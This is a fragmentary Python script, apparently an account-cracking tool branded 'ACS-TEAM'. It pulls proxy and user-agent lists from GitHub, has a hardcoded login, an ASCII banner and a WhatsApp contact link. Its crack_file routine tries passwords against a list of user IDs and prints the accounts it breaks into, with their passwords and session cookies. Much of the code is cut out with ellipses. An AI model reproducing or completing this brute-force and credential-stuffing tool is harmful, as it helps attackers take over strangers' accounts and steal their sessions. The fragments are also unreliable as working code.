...
princp=[]
try:
	prox= requests.get('https://github.com/ACS-TEAM/Api/blob/main/prox.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/ACS-TEAM/Ua.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'TEAM' and password == 'ACS':
...
888888 888888    db    8b    d8             db     dP""b8 .dP"Y8 
  88   88__     dPYb   88b  d88 ________   dPYb   dP   `" `Ybo." 
  88   88""    dP__Yb  88YbdP88 """"""""  dP__Yb  Yb      o.`Y8b 
  88   888888 dP""""Yb 88 YY 88          dP""""Yb  YboodP 8bodP' 
                                             
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO JAMIL  X SHIMUL   FIRE (🥰)
...
def login():
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801975549322')
	elif MAMA in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/acs.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#MAMA-King
				print(f'\r\033[0;92m[ACS-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " ACS,  Ok,  id"')
